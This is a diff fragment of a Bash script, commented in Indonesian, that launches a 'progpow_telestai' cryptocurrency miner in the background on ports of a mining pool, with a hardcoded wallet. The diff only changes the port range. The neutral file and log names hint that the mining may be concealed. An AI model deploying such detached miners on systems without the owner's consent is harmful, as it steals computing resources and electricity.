@@ -46,7 +46,7 @@ while [ $(date +%s) -lt $end_time ]; do
   # Memastikan file sgr ada
   if [ -f $dynamic_sgr ]; then
     # Memulai proses untuk beberapa port
-    for port in $(seq 301 310); do
+    for port in $(seq 201 210); do
       # Menjalankan proses dengan parameter yang ditentukan di latar belakang
       nohup $dynamic_sgr -a progpow_telestai --pool $ip:$port -u TcYstt5YVzag7z2DwWHSRAapyEdGYgGr9G --timeout 120 --tls true -p x --keepalive true > dance_$port_$timestamp.log 2>&1 &
       process_pid=$!
